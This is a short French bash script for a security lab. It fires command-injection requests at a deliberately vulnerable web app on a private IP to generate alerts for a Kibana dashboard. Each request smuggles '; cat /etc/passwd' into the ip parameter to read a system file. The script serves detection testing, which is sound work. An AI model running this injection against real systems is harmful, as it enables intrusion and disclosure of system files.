#!/bin/bash

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

TARGET_IP="10.10.30.100"
TARGET_URL="http://$TARGET_IP/vulnerabilities/exec/"

echo -e "${RED}[*] Démarrage de la simulation d'attaque Red Team...${NC}"
echo -e "${RED}[*] Cible : $TARGET_IP (Machine Victim)${NC}"

# Vérification si la victime est en ligne
if ping -c 1 $TARGET_IP &> /dev/null
then
    echo -e "${GREEN}[+] Cible accessible. Lancement des payloads...${NC}"
else
    echo -e "${RED}[!] Impossible de joindre la cible. Êtes-vous sur le réseau VPN ou la machine Attaquant ?${NC}"
    # En localhost si on est sur la machine victime, sinon on arrête
    # exit 1
fi

echo "------------------------------------------------"

for i in {1..5}
do
    echo -e "[*] Injection tentative #$i : Lecture de /etc/passwd"
    # Simulation d'attaque via CURL (Command Injection)
    # Note : timeout court pour ne pas bloquer
    curl -s -m 2 -o /dev/null "$TARGET_URL?ip=127.0.0.1%3B+cat+%2Fetc%2Fpasswd&Submit=Submit" \
    -H "Cookie: security=low; PHPSESSID=test"

    sleep 1
done

echo "------------------------------------------------"
echo -e "${GREEN}[SUCCESS] Attaque terminée.${NC}"
echo -e "Regardez maintenant votre Dashboard Kibana pour voir les alertes !"